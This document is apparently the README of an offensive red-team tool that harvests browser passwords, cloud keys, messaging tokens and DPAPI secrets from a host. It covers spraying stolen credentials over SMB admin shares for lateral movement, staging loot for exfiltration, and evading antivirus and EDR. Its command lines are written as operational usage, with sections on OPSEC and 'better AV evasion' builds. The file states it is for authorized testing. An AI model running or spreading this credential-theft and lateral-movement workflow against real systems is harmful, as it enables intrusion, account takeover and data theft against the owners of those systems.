# Treasure Hunter

Red team file discovery, credential extraction, and lateral movement tool. Scans target systems for valuable files -- passwords, tokens, keys, configs, documents -- using intelligent scoring, extracts actual credential data, then uses stolen credentials to move laterally across the network.

**Zero external dependencies.** Pure Python stdlib + ctypes. Compiles to a single executable via Nuitka for USB deployment.

## Quick Start

```bash
# Install
pip install -e .

# Quick 5-minute smash-and-grab scan
treasure-hunter

# Full comprehensive scan with all grabber modules
treasure-hunter -p full

# Scan specific directory
treasure-hunter -t C:\Users\target

# Scan network shares (auto-discover, hostname, or CIDR)
treasure-hunter --network auto
treasure-hunter --network 10.0.0.0/24
treasure-hunter --network fileserver.corp.local

# Encrypt results (OPSEC — protects output if USB is seized)
treasure-hunter -p full --encrypt --passphrase "my passphrase"

# Decrypt results later
treasure-hunter --decrypt results.jsonl.enc --passphrase "my passphrase"

# Stage high-value files for exfiltration
treasure-hunter -p full --stage /tmp/loot --compress

# Delta scan (only show new findings since last run)
treasure-hunter -p full --baseline previous-results.jsonl

# Generate HTML report for engagement deliverable
treasure-hunter -p full --html report.html

# Estimate exfil size without copying
treasure-hunter -p full --estimate

# Lateral movement: test stolen creds against network hosts
treasure-hunter -p full --lateral
treasure-hunter -p full --lateral --lateral-targets 10.0.0.0/24
treasure-hunter -p full --lateral --lateral-max-hosts 5

# Scan-only mode (no credential extraction)
treasure-hunter --no-grabbers

# Run specific grabber modules only
treasure-hunter --grabbers cloud_cred git_cred browser
```

## What It Does

Treasure Hunter operates in four layers:

### Layer 1: File Discovery (Scanner Engine)

A three-phase scan that finds valuable files using **533 detection patterns** across 6 value categories:

| Category | Weight | What It Finds |
|----------|--------|---------------|
| **Credentials & Secrets** | 5 | Password managers, SSH keys, .env files, API keys, browser DBs |
| **Unreleased Software** | 4 | Pre-release builds, internal installers, firmware |
| **Infrastructure Intel** | 4 | VPN configs, RDP files, Terraform state, AD exports |
| **Backups & Archives** | 4 | SQL dumps, database files, VM snapshots |
| **Sensitive Documents** | 3 | PII, financials, legal docs, Outlook PST/OST |
| **Source Code & IP** | 3 | Proprietary repos, build artifacts, design files |

**Scan Phases:**
1. **Recon** — Fast metadata sweep, build priority queues
2. **Targeted** — Analyze high-value files first (credentials, recent files)
3. **Sweep** — Comprehensive scan of remaining locations

### Layer 2: Credential Extraction (Grabber Modules)

After file discovery, **15 grabber modules** parse and extract actual credential data:

| Module | Targets | Decrypts? |
|--------|---------|-----------|
| `browser` | Chrome, Edge, Brave, Firefox saved passwords + cookies | DPAPI + AES-GCM |
| `cloud_cred` | AWS, Azure, GCP, k8s, Docker, Terraform, Vault, GH CLI | Plaintext |
| `remote_access` | FileZilla, WinSCP, mRemoteNG, MobaXterm | Base64 / AES-CBC |
| `messaging` | Slack, Discord, Teams tokens from LevelDB | Plaintext |
| `git_cred` | .git-credentials, .gitconfig, repo configs | Plaintext |
| `dev_tools` | VS Code, Postman, npm, pip, Maven, Gradle, NuGet, Cargo | Plaintext |
| `history` | PowerShell, Bash, Zsh command history | Regex scan |
| `notes` | Windows Sticky Notes, Obsidian vaults | SQLite + regex |
| `email` | Outlook PST/OST discovery, Thunderbird profiles | Metadata |
| `wifi` | Windows WiFi profiles, Linux NetworkManager | XML / INI |
| `dpapi` | Windows Credential Manager, DPAPI master keys | Catalog |
| `registry` | PuTTY sessions, WinSCP, AutoLogon, SAM flagging | Registry read |
| `cert` | PFX/P12, PEM keys, GPG keyrings, Java KeyStores | Catalog |
| `session` | RDP history, .rdp files, Terminal Server Client | Registry + file |
| `process` | Process memory string scanning (disabled by default) | Memory read |
| `clipboard` | Windows clipboard history + current clipboard | SQLite + ctypes |

### Layer 3: Lateral Movement

After extracting credentials locally, tests them against discovered network hosts via SMB admin shares (C$). On successful authentication, mounts the remote filesystem and runs a scan.

| Feature | Description |
|---------|-------------|
| **Host Discovery** | Auto-discover from mapped drives, LOGONSERVER, DNS; or specify IPs/CIDRs |
| **Credential Reuse** | Extracted passwords tested against network hosts via `WNetAddConnection2W` |
| **Targeted Spray** | Credentials with matching hostnames (from remote access tools) tested first |
| **Remote Scanning** | Successful auth mounts C$ share, runs smash-profile scan on remote files |
| **Lockout Protection** | Per-account failure tracking, configurable threshold (default: 3) |
| **Safety Rails** | Max hosts, hop depth limit, host whitelist/blacklist, TTL, kill switch |
| **OPSEC** | `CONNECT_TEMPORARY` flag -- no persistent drive mappings, auto-cleanup |

```bash
treasure-hunter -p full --lateral                              # auto-discover + spray
treasure-hunter -p full --lateral --lateral-targets 10.0.0.0/24  # target subnet
treasure-hunter -p full --lateral --lateral-max-hosts 5          # limit blast radius
treasure-hunter -p full --lateral --lateral-max-failures 2       # strict lockout
```

### Layer 4: Operational Features

| Feature | Flag | Description |
|---------|------|-------------|
| **Output Encryption** | `--encrypt` | AES-256-GCM encryption of results with PBKDF2 key derivation |
| **Network Scanning** | `--network` | SMB share enumeration via NetShareEnum + CIDR subnet probing |
| **Exfil Staging** | `--stage DIR` | Copy high-value files to staging directory with manifest |
| **Compression** | `--compress` | Zip staged files for exfiltration (combine with `--encrypt`) |
| **Size Estimation** | `--estimate` | Estimate exfil payload size without copying |
| **Delta Scanning** | `--baseline FILE` | Only report new findings compared to a previous scan |
| **HTML Reports** | `--html FILE` | Self-contained dark-themed HTML report for deliverables |
| **Decryption** | `--decrypt FILE` | Decrypt previously encrypted results |
| **Lateral Movement** | `--lateral` | Test extracted creds against network hosts via SMB |
| **Lateral Targets** | `--lateral-targets` | Override host discovery (auto, IP, CIDR, hostname) |
| **Max Hosts** | `--lateral-max-hosts N` | Cap on hosts to attempt (default: 10) |
| **Lockout Threshold** | `--lateral-max-failures N` | Max failures per account before skip (default: 3) |
| **Hop Depth** | `--lateral-depth N` | Max propagation depth (default: 1) |
| **SMB Timeout** | `--lateral-timeout N` | Connection timeout in seconds (default: 10) |

## Scan Profiles

| Profile | Duration | Threads | Use Case |
|---------|----------|---------|----------|
| `smash` | 5 min | 16 | Quick smash-and-grab |
| `triage` | 30 min | 12 | Operational planning |
| `full` | No limit | 8 | Complete intelligence gathering |
| `stealth` | No limit | 2 | Low-profile, minimal system impact |

```bash
treasure-hunter -p smash      # Fast, high-confidence hits only
treasure-hunter -p triage     # Balanced scan
treasure-hunter -p full       # Everything
treasure-hunter -p stealth    # Minimal footprint
```

## Architecture

```
treasure_hunter/
├── cli.py                  # CLI with 4 scan profiles + operational flags
├── scanner.py              # Five-phase scan engine (Recon -> Targeted -> Grab -> Lateral -> Sweep)
├── lateral.py              # Lateral movement: credential reuse + remote scanning
├── models.py               # Finding, Signal, ScanResult, LateralResult data models
├── entropy.py              # Shannon entropy for secret detection
├── reporter.py             # Real-time JSONL streaming output
├── crypto.py               # Output encryption (AES-256-GCM + PBKDF2)
├── network.py              # SMB share enumeration + CIDR scanning
├── exfil.py                # Exfiltration staging, compression, size estimation
├── delta.py                # Delta/re-scan baseline comparison
├── report.py               # Self-contained HTML report generator
├── rules/
│   └── value_taxonomy.py   # 6 categories, 533 detection patterns
└── grabbers/               # 16 credential extraction modules
    ├── __init__.py          # Auto-discovery registry
    ├── base.py              # GrabberModule ABC + GrabberContext
    ├── models.py            # ExtractedCredential, GrabberResult
    ├── utils.py             # SQLite copy-read, safe I/O helpers
    ├── _crypto.py           # AES-CBC, AES-GCM, DPAPI (pure Python)
    ├── _leveldb.py          # Minimal LevelDB string extractor
    ├── _registry.py         # Windows Registry safe-read wrappers
    ├── browser.py           # Chrome/Edge/Brave/Firefox
    ├── cloud_cred.py        # AWS/Azure/GCP/k8s/Docker/Terraform/Vault
    ├── remote_access.py     # FileZilla/WinSCP/mRemoteNG/MobaXterm
    ├── messaging.py         # Slack/Discord/Teams
    ├── git_cred.py          # Git credential stores
    ├── dev_tools.py         # VS Code/Postman/npm/pip/Maven/Gradle
    ├── history.py           # Shell command history
    ├── notes.py             # Sticky Notes/Obsidian
    ├── email.py             # Outlook/Thunderbird
    ├── wifi.py              # WiFi profiles
    ├── dpapi.py             # DPAPI credential stores
    ├── registry.py          # PuTTY/WinSCP/AutoLogon
    ├── cert.py              # Certificates/keys/GPG
    ├── clipboard.py         # Clipboard history + screenshots
    ├── process.py           # Process memory scanning
    └── session.py           # RDP/remote sessions
```

## Output Format

Results stream to a JSONL file in real-time (crash-resilient):

```jsonl
{"type":"scan_start","scan_id":"scan_1712973600","target_paths":["C:\\Users"]}
{"type":"finding","file_path":"...\\Login Data","severity":"CRITICAL","total_score":225,"signals":[...]}
{"type":"credential","source_module":"cloud_cred","credential_type":"key","target_application":"AWS","username":"AKIAEXAMPLE"}
{"type":"credential","source_module":"browser","credential_type":"password","target_application":"Chrome","url":"https://mail.google.com"}
{"type":"lateral_attempt","host":"10.0.0.5","share":"C$","username":"admin","status":"logon_failure","error_code":1326}
{"type":"lateral_success","host":"10.0.0.5","share":"C$","username":"svc_backup","credential_source":"remote_access"}
{"type":"finding","file_path":"\\\\10.0.0.5\\C$\\Users\\...","severity":"HIGH","total_score":150,"signals":[...]}
{"type":"lateral_summary","targets_discovered":8,"targets_compromised":2,"credentials_tested":24}
{"type":"scan_complete","stats":{"total_files_scanned":12500,"total_findings":47,"total_credentials_harvested":23}}
```

## Scoring System

Files are scored additively across multiple signal types:

| Signal | Score |
|--------|-------|
| Extension match | `category_weight × 15` |
| Keyword match | `category_weight × 12` |
| Path pattern | `category_weight × 20` |
| Content pattern | `category_weight × 10` |
| Recency (< 30 days) | `+10 to +15` |
| Entropy (high) | `+15 to +20` |
| Grabber extraction | `+75 per credential` |

**Severity thresholds:** CRITICAL (200+), HIGH (120+), MEDIUM (60+), LOW (25+)

## Adding Grabber Modules

Drop a `.py` file in `treasure_hunter/grabbers/` with a class inheriting `GrabberModule`:

```python
from treasure_hunter.grabbers.base import GrabberModule, GrabberContext
from treasure_hunter.grabbers.models import ExtractedCredential, GrabberResult, GrabberStatus

class MyGrabber(GrabberModule):
    name = "my_grabber"
    description = "Extract credentials from MyApp"
    supported_platforms = ("Windows", "Darwin", "Linux")

    def preflight_check(self, context: GrabberContext) -> bool:
        return os.path.exists("/path/to/myapp/config")

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)
        # ... extract credentials ...
        result.credentials.append(ExtractedCredential(
            source_module=self.name,
            credential_type="password",
            target_application="MyApp",
            username="admin",
            decrypted_value="secret123",
        ))
        return result
```

It will be auto-discovered by the registry — no registration needed.

## OPSEC

- **Zero network connections** — all analysis is local (unless `--network` is used)
- **Encrypted output** — AES-256-GCM with `--encrypt` protects results if seized
- **Shred after encrypt** — plaintext results overwritten with random data before deletion
- **Minimal disk writes** — only JSONL output file (or encrypted .enc)
- **No subprocess calls** — pure Python + ctypes (no PowerShell, no cmd)
- **Graceful failures** — every module catches its own exceptions
- **Copy-then-read** for locked SQLite DBs (Chrome, Firefox)
- **Same-directory temp files** — avoids monitored %TEMP% directory
- **Configurable thread limits** to avoid CPU spikes
- **Process memory scanning disabled by default** (highest EDR risk)
- **Lateral movement opt-in** (`--lateral` required) with lockout protection
- **CONNECT_TEMPORARY** for SMB -- no persistent drive mappings
- **Auto-cleanup** disconnects all mounted shares on exit

## Testing

```bash
pip install -e ".[dev]"
pytest tests/ -v
```

237 tests covering scanner engine, entropy analysis, value taxonomy, grabber framework, individual module parsers, and lateral movement.

CI runs tests on Linux, Windows, and macOS across Python 3.10-3.12 via GitHub Actions.

## Building for Deployment

Automated builds via GitHub Actions on tagged releases (push a `v*` tag to trigger):

```bash
# Tag a release → triggers automated Windows + Linux .exe builds
git tag v0.1.0
git push origin v0.1.0
```

Manual builds:
```bash
# Nuitka (recommended — better AV evasion)
pip install nuitka
python -m nuitka --standalone --onefile --output-filename=treasure-hunter.exe treasure_hunter/__main__.py

# PyInstaller (faster builds)
pip install pyinstaller
pyinstaller --onefile treasure_hunter/__main__.py --name treasure-hunter
```

## MITRE ATT&CK Coverage

| Technique | ID | Modules |
|-----------|-----|---------|
| Data from Local System | T1005 | Scanner, notes, wifi |
| Credentials In Files | T1552.001 | cloud_cred, git_cred, dev_tools, remote_access |
| Credentials in Registry | T1552.002 | registry |
| Bash History | T1552.003 | history |
| Private Keys | T1552.004 | cert |
| Credentials from Web Browsers | T1555.003 | browser |
| Windows Credential Manager | T1555.004 | dpapi |
| Steal Application Access Token | T1528 | messaging |
| Local Email Collection | T1114.001 | email |
| Remote Desktop Protocol | T1021.001 | session |
| SAM | T1003.002 | registry |
| LSASS Memory | T1003.001 | process |
| Clipboard Data | T1115 | clipboard |
| Screen Capture | T1113 | clipboard |
| Network Share Discovery | T1135 | network |
| Data from Network Shared Drive | T1039 | network |
| SMB/Windows Admin Shares | T1021.002 | lateral |
| Valid Accounts | T1078 | lateral |
| Local Data Staging | T1074.001 | exfil |
| Archive Collected Data | T1560.001 | exfil |

## License

For authorized security testing, red team engagements, and educational purposes only.
